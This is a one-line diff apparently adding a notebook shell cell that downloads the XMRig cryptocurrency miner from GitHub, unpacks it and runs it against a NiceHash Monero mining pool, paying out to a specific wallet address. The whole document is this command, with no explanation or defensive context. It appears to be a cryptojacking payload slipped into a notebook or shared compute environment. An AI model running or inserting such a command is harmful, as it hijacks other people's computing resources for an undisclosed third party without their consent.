@@ -1,0 +1,1 @@
+! wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxvf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 --coin=monero -u 373Ee6DSDgAYNAVSnfgUV99248L6Ab7aUH.xp74glmkva6lytd -k --nicehash
